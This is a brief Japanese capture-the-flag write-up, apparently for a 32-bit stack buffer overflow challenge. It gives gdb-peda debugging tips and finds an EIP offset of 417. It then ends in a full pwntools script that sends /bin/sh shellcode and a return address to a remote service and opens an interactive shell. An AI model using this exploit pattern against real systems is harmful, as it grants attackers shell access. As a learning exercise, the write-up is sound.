# ポイント

- デバッグがうまくいかないことが多い。
  `ni` の挙動がおかしい時は、ブレークポイントしかけて`c` すればだいたい乗り切れる。
- gdb-pedaで `pattern_create 512` で長い文字列作って、 `run` して打ち込んであげればEIPが奪える。
  `pattern_offset nAsC` でオフセットが417であることが分かる。
- あとはユーザーの入力が保持されるバッファのアドレスがなかなか分からない。気合い。



# 解法

0x804A8D0 の関数が入力を行い、0x806B3E0の関数あたりで[esi] に書き込んでいる。

gdbで `hoge` とか入力してひたすら追って行ったらわかった。



```python
#!/usr/bin/python
# -*- coding: utf-8 -*-

from pwn import *

rhp = {'host': '192.168.33.20', 'port':1234}
conn = remote(rhp['host'], rhp['port'])

shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

res = conn.recvline()
log.info(res)


input_addr = 0x80f0340

payload = shellcode
payload += b'A' * (417 - len(shellcode))
payload += p32(input_addr)

conn.sendline(payload)
log.info('send payload')

conn.interactive()

```









